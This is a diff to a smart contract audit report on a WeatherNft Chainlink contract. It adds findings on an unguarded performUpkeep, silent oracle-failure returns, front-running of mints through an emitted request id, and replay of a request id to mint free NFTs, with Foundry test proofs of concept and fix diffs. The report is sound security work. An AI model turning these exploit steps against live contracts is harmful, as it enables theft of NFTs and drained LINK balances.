@@ -1,13 +1,439 @@
-### [S-#] TITLE (Root Cause + Impact)
 
+### [S-#] `WeatherNft::performUpkeep` can be called by anyone with any parameter
 **Description:**\
+The `performUpkeep` function haven't any address or input data validation in his `performData` parameter, making it can be called from any address and with any parameter 
 
-**Impact:**\
+**Impact:**
+- If the decoded `performData` is a valid TokenId: the related token update his wheather data.
+- If the decoded `performData` is not a valid TokenId: the WeatherNft contract will send a request to chainlink functions a invalid request.
+- In all scenarios, unauthorized calls to performUpkeep can waste gas and deplete the contract's LINK balance.
+
 
 **Proof of Concept:**\
+Add the following to the test suite:
+
+<details><summary>PoC</summary>
+
+```javascript
+function testCanBeCalledByAnyoneWithAnithing() public {
+    string memory pincode = "125001";
+    string memory isoCode = "IN";
+    bool registerKeeper = true;
+    uint256 heartbeat = 12 hours;
+    uint256 initLinkDeposit = 5e18;
+    address attacker = makeAddr("attacker");
+    uint256 functionRouterBalance;
+
+    vm.startPrank(user);
+
+    linkToken.approve(address(weatherNft), initLinkDeposit);
+
+    bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
+        pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
+    );
+    vm.stopPrank();
+
+    vm.prank(functionsRouter);
+    bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
+    weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");
+
+    uint256 userTokenId = weatherNft.s_tokenCounter();
+    vm.prank(user);
+    weatherNft.fulfillMintRequest(reqId);
+
+    //// If the decoded `performData` is a valid TokenId: the related token update his wheather data.
+
+    // Retrieve the lastFulfilledAt value
+    (, uint256 prevLastFulfilled,,,) = weatherNft.s_weatherNftInfo(userTokenId);
+    // advance some in time
+    vm.warp(1 hours);
+
+    // get the functionsRouter balance
+    functionRouterBalance = linkToken.balanceOf(functionsRouter);
+    vm.prank(attacker);
+    weatherNft.performUpkeep(abi.encode(userTokenId));
+
+    vm.prank(functionsRouter);
+    weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
+    weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");
+
+    (, uint256 lastFulfilled,,,) = weatherNft.s_weatherNftInfo(userTokenId);
+    // Check for update
+    assert(prevLastFulfilled < lastFulfilled);
+    // Check if router balance decreased
+    assert(functionRouterBalance > linkToken.balanceOf(functionsRouter));
+
+    //// If the decoded `performData` is not a valid TokenId: the WeatherNft contract will send a request to chainlink functions a invalid request.
+
+    // get the functionsRouter balance
+    functionRouterBalance = linkToken.balanceOf(functionsRouter);
+    vm.prank(attacker);
+    weatherNft.performUpkeep(abi.encode("HELLO FRIENDS"));
+
+    // Check if router balance decreased
+    assert(functionRouterBalance > linkToken.balanceOf(functionsRouter));
+}
+```
+</details>
 
 **Recommended Mitigation:**\
+Allow only the Weather Nft Owner and the related Keeper to call `performUpkeep`
 
+### [S-#] Functions `WeatherNft::fulfillMintRequest` and `WeatherNft::_fulfillWeatherUpdate` empty return after Chainlink Function response check.
+
+**Description:**\
+`WeatherNft::fulfillMintRequest` and `WeatherNft::_fulfillWeatherUpdate` make checks on the response length and the error message length and if a issue is find, return the function without give any reason.
+
+<details>
+
+On `WeatherNft::fulfillMintRequest`:
+
+```javascript
+function fulfillMintRequest(bytes32 requestId) external {
+    require(msg.sender == s_reqIdToUser[requestId], "Invalid user");
+
+    bytes memory response = s_funcReqIdToMintFunctionReqResponse[requestId].response;
+    bytes memory err = s_funcReqIdToMintFunctionReqResponse[requestId].err;
+
+    require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
+@>  if (response.length == 0 || err.length > 0) {
+@>      return;
+@>  }
+
+    UserMintRequest memory _userMintRequest = s_funcReqIdToUserMintReq[requestId];
+    .
+    .
+```
+On `WeatherNft::_fulfillWeatherUpdate`:
+
+```javascript
+function _fulfillWeatherUpdate(bytes32 requestId, bytes memory response, bytes memory err) internal {
+@>  if (response.length == 0 || err.length > 0) {
+@>      return;
+@>  }
+
+    uint256 tokenId = s_funcReqIdToTokenIdUpdate[requestId];
+    .
+    .
+```
+</details>
+
+**Impact:**\
+The user never knows what issue in the Chainlin Function response cause the return
+
+**Recommended Mitigation:**\
+Return the consice issue.
+
+<details><summary>Example</summary>
+
+On `WeatherNft::fulfillMintRequest`:
+
+```diff
+function fulfillMintRequest(bytes32 requestId) external {
+    require(msg.sender == s_reqIdToUser[requestId], "Invalid user");
+
+    bytes memory response = s_funcReqIdToMintFunctionReqResponse[requestId].response;
+    bytes memory err = s_funcReqIdToMintFunctionReqResponse[requestId].err;
+
+    require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
+-   if (response.length == 0 || err.length > 0) {
+-       return;
+-   }
++   if (response.length == 0) {
++       require(false, "Response Empty");
++   } else if (err.length > 0) {
++       require(false, string(err));
++   }
+
+    UserMintRequest memory _userMintRequest = s_funcReqIdToUserMintReq[requestId];
+    .
+    .
+```
+On `WeatherNft::_fulfillWeatherUpdate`:
+```diff
+function _fulfillWeatherUpdate(bytes32 requestId, bytes memory response, bytes memory err) internal {
+-   if (response.length == 0 || err.length > 0) {
+-       return;
+-   }
++   if (response.length == 0) {
++       require(false, "Response Empty");
++   } else if (err.length > 0) {
++       require(false, string(err));
++   }
+
+    uint256 tokenId = s_funcReqIdToTokenIdUpdate[requestId];
+    .
+    .
+```
+</details>
+
+### [S-#] Event on `WeatherNft::requestMintWeatherNFT` makes `WeatherNft::fulfillMintRequest` front-runnable
+
+**Description:**\
+When the event `WeatherNftStore::WeatherNFTMintRequestSent` is emited on `WeatherNft::requestMintWeatherNFT` execution, his `reqId` parameter can be catched and used for front-run the minting of Weather Nft calling `WeatherNft::fulfillMintRequest` before the legit user.
+
+<details>
+
+```javascript
+function requestMintWeatherNFT(
+    string memory _pincode, string memory _isoCode, bool _registerKeeper, uint256 _heartbeat, uint256 _initLinkDeposit)
+        external
+        payable
+        returns (bytes32 _reqId)
+    {
+        require(msg.value == s_currentMintPrice, WeatherNft__InvalidAmountSent());
+        s_currentMintPrice += s_stepIncreasePerMint;
+
+        if (_registerKeeper) {
+            addressToLinkDeposit[msg.sender] = _initLinkDeposit;
+            IERC20(s_link).safeTransferFrom(msg.sender, address(this), _initLinkDeposit);
+        }
+
+        _reqId = _sendFunctionsWeatherFetchRequest(_pincode, _isoCode);
+
+@>      emit WeatherNFTMintRequestSent(msg.sender, _pincode, _isoCode, _reqId);
+
+        s_funcReqIdToUserMintReq[_reqId] = UserMintRequest({
+            user: msg.sender,
+            pincode: _pincode,
+            isoCode: _isoCode,
+            // e - using a keeper or not
+            registerKeeper: _registerKeeper,
+            heartbeat: _heartbeat,
+            initLinkDeposit: _initLinkDeposit
+        });
+    }
+```
+</details>
+
+**Impact:**\
+Steal the Weather Nft from the user
+
+**Proof of Concept:**\
+Add the following to the test suite:
+
+<details><summary>PoC</summary>
+
+```javascript
+function testfulfillMintRequestCanBeFrontRun() public {
+    string memory pincode = "125001";
+    string memory isoCode = "IN";
+    bool registerKeeper = true;
+    uint256 heartbeat = 12 hours;
+    uint256 initLinkDeposit = 5e18;
+
+    address attacker = makeAddr("attacker");
+
+    vm.startPrank(user);
+    linkToken.approve(address(weatherNft), initLinkDeposit);
+
+    // The attacker is waiting for the right event log
+    vm.recordLogs();
+    weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
+        pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
+    );
+    vm.stopPrank();
+
+    Vm.Log[] memory logs = vm.getRecordedLogs();
+    bytes32 reqId;
+    for (uint256 i; i < logs.length; i++) {
+        if (logs[i].topics[0] == keccak256("WeatherNFTMintRequestSent(address,string,string,bytes32)")) {
+            // Get the reqId
+            (,,, reqId) = abi.decode(logs[i].data, (address, string, string, bytes32));
+            break;
+        }
+    }
+
+    vm.prank(functionsRouter);
+    bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
+    weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");
+
+    // calculates the new tokenId
+    uint256 tokenIdAttacker = weatherNft.s_tokenCounter();
+    // Minting with the user reqId before he
+    vm.prank(attacker);
+    weatherNft.fulfillMintRequest(reqId);
+    assertEq(attacker, weatherNft.ownerOf(tokenIdAttacker));
+}
+```
+</details>
+
+**Recommended Mitigation:**\
+Associate the requestId with the user and check this on `WeatherNft::fulfillMintRequest`
+
+<details><summary>Example</summary>
+
+On `WheatherNftStore` add:
+```diff
+    .
+    .
+    // variables
+    uint256 public s_tokenCounter;
++   mapping(bytes32 => address) public s_reqIdToUser;
+    mapping(Weather => string) public s_weatherToTokenURI;
+    FunctionsConfig public s_functionsConfig;
+    mapping(bytes32 => UserMintRequest) public s_funcReqIdToUserMintReq;
+    mapping(bytes32 => MintFunctionReqResponse) public s_funcReqIdToMintFunctionReqResponse;
+    mapping(bytes32 => uint256) public s_funcReqIdToTokenIdUpdate;
+    .
+    .
+```
+On `WeatherNft::requestMintWeatherNFT` add:
+```diff
+    function requestMintWeatherNFT(string memory _pincode, string memory _isoCode, bool _registerKeeper, uint256 _heartbeat, uint256 _initLinkDeposit)
+        external
+        payable
+        returns (bytes32 _reqId)
+    {
+        require(msg.value == s_currentMintPrice, WeatherNft__InvalidAmountSent());
+        s_currentMintPrice += s_stepIncreasePerMint;
+
+        if (_registerKeeper) {
+            addressToLinkDeposit[msg.sender] = _initLinkDeposit;
+            IERC20(s_link).safeTransferFrom(msg.sender, address(this), _initLinkDeposit);
+        }
+
+        _reqId = _sendFunctionsWeatherFetchRequest(_pincode, _isoCode);
+
++       s_reqIdToUser[_reqId] = msg.sender;
+
+        emit WeatherNFTMintRequestSent(msg.sender, _pincode, _isoCode, _reqId);
+    .
+    .
+```
+On `WeatherNft::fulfillMintRequest` add:
+```diff
+    function fulfillMintRequest(bytes32 requestId) external {
++       require(msg.sender == s_reqIdToUser[requestId], "Invalid user");
+        bytes memory response = s_funcReqIdToMintFunctionReqResponse[requestId].response;
+        bytes memory err = s_funcReqIdToMintFunctionReqResponse[requestId].err;
+
+        require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
+        // @? - returns without a error reason
+        if (response.length == 0 || err.length > 0) {
+            return;
+        }
+
+        UserMintRequest memory _userMintRequest = s_funcReqIdToUserMintReq[requestId];
+        uint8 weather = abi.decode(response, (uint8));
+        uint256 tokenId = s_tokenCounter;
+        s_tokenCounter++;
+    .
+    .
+```
+</details>
+
+
+### [S-#] Request Id parameter can be used multiple times for WeatherNft minting
+
+**Description:**\
+The requestId parameter on `WeatherNft::fulfillMintRequest` function can be reused multiple times for minting Weather NFTs and this allows malicious users to replay the same requestId and mint multiple NFTs without paying additional fees.
+
+**Impact:**
+- Financial loss for the platform
+- Inflation of the NFT supply
+- Reduced trust in the system
+
+**Proof of Concept:**\
+Add the following to the test suite:
+
+<details><summary>PoC</summary>
+
+```javascript
+function testRequestIdCanBeReusedForNewNftMints() public {
+        string memory pincode = "125001";
+        string memory isoCode = "IN";
+        bool registerKeeper = true;
+        uint256 heartbeat = 12 hours;
+        uint256 initLinkDeposit = 5e18;
+        // create attakers accounts
+        address attackerA = makeAddr("attackerA");
+        address attackerB = makeAddr("attackerB");
+        address attackerC = makeAddr("attackerC");
+
+        vm.startPrank(user);
+
+        linkToken.approve(address(weatherNft), initLinkDeposit);
+
+        bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
+            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
+        );
+        vm.stopPrank();
+
+        vm.prank(functionsRouter);
+        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
+        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");
+
+        // The valid WeatherNft minitng
+        uint256 tokenIdUser = weatherNft.s_tokenCounter();
+        vm.prank(user);
+        weatherNft.fulfillMintRequest(reqId);
+
+        // The invalid ones using the same requestId
+        uint256 tokenIdAttackerA = weatherNft.s_tokenCounter();
+        vm.prank(attackerA);
+        weatherNft.fulfillMintRequest(reqId);
+
+        uint256 tokenIdAttackerB = weatherNft.s_tokenCounter();
+        vm.prank(attackerB);
+        weatherNft.fulfillMintRequest(reqId);
+
+        uint256 tokenIdAttackerC = weatherNft.s_tokenCounter();
+        vm.prank(attackerC);
+        weatherNft.fulfillMintRequest(reqId);
+
+        assertEq(user, weatherNft.ownerOf(tokenIdUser));
+        assertEq(attackerA, weatherNft.ownerOf(tokenIdAttackerA));
+        assertEq(attackerB, weatherNft.ownerOf(tokenIdAttackerB));
+        assertEq(attackerC, weatherNft.ownerOf(tokenIdAttackerC));
+    }
+```
+</details>
+
+**Recommended Mitigation:**\
+Add a mechanism to mark the requestId as "used" after processing.
+
+<details><summary>Example</summary>
+
+On `WheatherNftStore` add:
+```diff
+    .
+    .
+    // variables
+    uint256 public s_tokenCounter;
++   mapping(bytes32 => bool) public s_reqIdToAlreadyUsed;
+    mapping(Weather => string) public s_weatherToTokenURI;
+    FunctionsConfig public s_functionsConfig;
+    mapping(bytes32 => UserMintRequest) public s_funcReqIdToUserMintReq;
+    mapping(bytes32 => MintFunctionReqResponse) public s_funcReqIdToMintFunctionReqResponse;
+    mapping(bytes32 => uint256) public s_funcReqIdToTokenIdUpdate;
+    .
+    .
+```
+On `WeatherNft::fulfillMintRequest` add:
+```diff
+    .
+    .
+    function fulfillMintRequest(bytes32 requestId) external {
++       require(!s_reqIdToAlreadyUsed[requestId], "Request Id already used");
++       s_reqIdToAlreadyUsed[requestId] = true;
+        bytes memory response = s_funcReqIdToMintFunctionReqResponse[requestId].response;
+        bytes memory err = s_funcReqIdToMintFunctionReqResponse[requestId].err;
+
+        require(response.length > 0 || err.length > 0, WeatherNft__Unauthorized());
+        // @? - returns without a error reason
+        if (response.length == 0 || err.length > 0) {
+            return;
+        }
+
+        UserMintRequest memory _userMintRequest = s_funcReqIdToUserMintReq[requestId];
+        uint8 weather = abi.decode(response, (uint8));
+        uint256 tokenId = s_tokenCounter;
+        s_tokenCounter++;
+    .
+    .
+```
+</details>
 
 ### [S-#] If an error in `WeatherNft::fulfillMintRequest` occurs the user can't withdraw the deposited Link.
 
@@ -76,10 +502,10 @@ On `WeatherNft` add:
 
 ```diff
     // functions
-+   fucntion withdrawLinks(_tokenId) external {
++   function withdrawLinks(uint256 _tokenId) external {
 +       address owner = _ownerOf(_tokenId);
 +       if (owner != msg.sender) {
-+           revert WeatherNft__Unauthorized()
++           revert WeatherNft__Unauthorized();
 +       } else {
 +           LinkTokenInterface(s_link).approve(owner, addressToLinkDeposit[owner]);
 +           IERC20(s_link).safeTransferFrom(address(this), address(this), addressToLinkDeposit[owner]);
@@ -106,7 +532,6 @@ On `WeatherNft` add:
         payable
         returns (bytes32 _reqId)
     {
-        // @? - multicall exploit
         require(msg.value == s_currentMintPrice, WeatherNft__InvalidAmountSent());
         s_currentMintPrice += s_stepIncreasePerMint;
 
